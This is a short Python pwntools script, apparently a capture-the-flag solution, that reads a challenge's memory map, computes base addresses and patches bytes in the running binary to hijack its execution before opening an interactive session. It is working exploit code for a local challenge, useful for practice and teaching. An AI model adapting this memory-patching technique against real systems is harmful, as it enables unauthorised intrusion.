# Copyright 2023 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *

context.log_level = "DEBUG"

r = remote("localhost", 1337)
flaglen = 13

s = r.recvuntil(b"\n\n").decode().splitlines()[2:]
base = None
for line in s:
  if "chal" in line and base is None:
    base = int(line.split("-")[0], 16)
  if "stack" in line:
    stack = int(line.split("-")[1].split()[0], 16)

print(hex(base), hex(stack))

def nop2(addr):
  r.sendline(b"0x%x 2" % (addr+base))
  sleep(0.1)

nop2(0x15d1)
nop2(0x15d0)
nop2(0x15cf)
nop2(0x15ce)
nop2(0x15cd)
nop2(0x15cc)
nop2(0x15cb)
nop2(0x15ca)
nop2(0x15c9)
r.sendline(b"0x%x 127" % (0x218e+base))
sleep(0.1)
r.sendline()
r.interactive()
